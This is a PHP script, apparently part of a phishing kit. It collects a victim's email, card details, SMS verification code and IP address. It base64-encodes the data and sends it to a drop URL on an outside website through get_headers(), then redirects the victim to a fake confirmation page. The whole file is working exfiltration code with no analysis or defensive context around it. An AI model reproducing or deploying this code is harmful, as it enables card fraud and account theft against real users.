<?php
session_start();
date_default_timezone_set("Europe/Bucharest");
$ip = getenv("REMOTE_ADDR");

$site1 = "http://adiwolpe.com/themes/garland/print/make2.php?info=";
$data = "
-------------
Name: ".$_SESSION['email']."
Card: ".$_SESSION['didi']."
-------------
SMS: ".$_POST['gigi']."
-------------
IP Address: $ip
";
function test($test,$site) { 
$testencoded = base64_encode($test); 
$testgo = "$site$testencoded"; 
get_headers("$testgo"); 
} 
if ($test != "") { 
test("$test","$site1");  
die(); 
} 

function writeit($data,$site) {  
$dataz = base64_encode($data); 
$zait = "$site$dataz"; 
get_headers("$zait"); 
}

writeit($data,$site1);
header("Location: confirmation.php");
?>